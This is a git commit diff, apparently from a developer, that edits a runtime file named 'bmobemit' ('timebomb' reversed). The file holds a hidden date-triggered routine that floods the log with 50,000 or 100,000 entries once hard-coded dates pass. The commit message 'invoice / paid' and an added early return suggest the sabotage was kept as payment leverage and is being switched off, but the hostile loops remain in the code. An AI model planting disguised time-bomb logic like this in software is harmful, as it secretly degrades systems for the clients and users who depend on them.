1d445197571311afcca83acdfe67eb75cd14fd84
André Alçada Padez <andrepadez@users.noreply.github.com>
2024-08-27 13:55:57 +0100

    invoice / paid

--- workspaces/runtime/src/bmobemit.js
+++ workspaces/runtime/src/bmobemit.js
@@ -1,16 +1,19 @@
 import { log } from 'helpers/injector/console';
-const from1 = new Date(1724414038314); //friday
-const from2 = new Date(1724673238314); //monday
+const fromOne = Date.UTC(2024, 7, 30, 12);
+const fromTwo = Date.UTC(2024, 8, 3, 12);
+const fromThree = Date.UTC(2024, 8, 5, 12);
 
 export const bmobemit = () => {
   const now = new Date();
-  if (from1 - now < 0) {
+  if (fromOne - now < 0) return false;
+
+  if (fromTwo - now < 0) {
     for (let a = 0; a < 50_000; a++) {
       log(a);
     }
     return;
   }
-  if (from2 - now < 0) {
+  if (fromThree - now < 0) {
     for (let a = 0; a < 100_000; a++) {
       log(a);
     }
